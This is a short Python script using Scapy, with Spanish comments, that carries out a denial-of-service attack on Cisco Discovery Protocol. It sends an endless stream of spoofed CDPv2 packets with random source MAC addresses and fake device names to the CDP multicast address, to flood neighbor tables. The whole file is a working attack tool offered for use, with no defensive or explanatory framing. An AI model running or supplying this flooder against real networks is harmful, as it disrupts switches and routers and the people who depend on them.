#!/usr/bin/env python3
from scapy.all import *
load_contrib("cdp")
import random
import time

# --- CONFIGURACIÓN ---
iface = "ens3"
target_mac = "01:00:0c:cc:cc:cc" 
ttl = 180
# ---------------------

print(f"[+] Iniciando ataque DoS CDP en {iface}...")
print(f"[+] Presiona Ctrl + C para detener.")

try:
    while True:
        # Generar nombre aleatorio para inundar la tabla
        device_name = f"FakeDevice_{random.randint(1000,9999)}"
        
        # Construir paquete CDPv2 compatible con Scapy moderno
        packet = Ether(dst=target_mac, src=RandMAC()) / \
                 LLC(dsap=0xaa, ssap=0xaa, ctrl=0x03) / \
                 SNAP(OUI=0x00000c, code=0x2000) / \
                 CDPv2_HDR(ttl=ttl) / \
                 CDPMsgDeviceID(val=device_name) / \
                 CDPMsgPlatform(val="Cisco IOS") / \
                 CDPMsgPortID(iface="GigabitEthernet0/1") / \
                 CDPMsgSoftwareVersion(val="15.2(4)M3")

        # Enviar paquete
        sendp(packet, iface=iface, verbose=False)
        # Pequeña pausa para no bloquear tu propia PC, pero suficiente para saturar
        time.sleep(0.01) 

except KeyboardInterrupt:
    print("\n[!] Ataque detenido por el usuario.")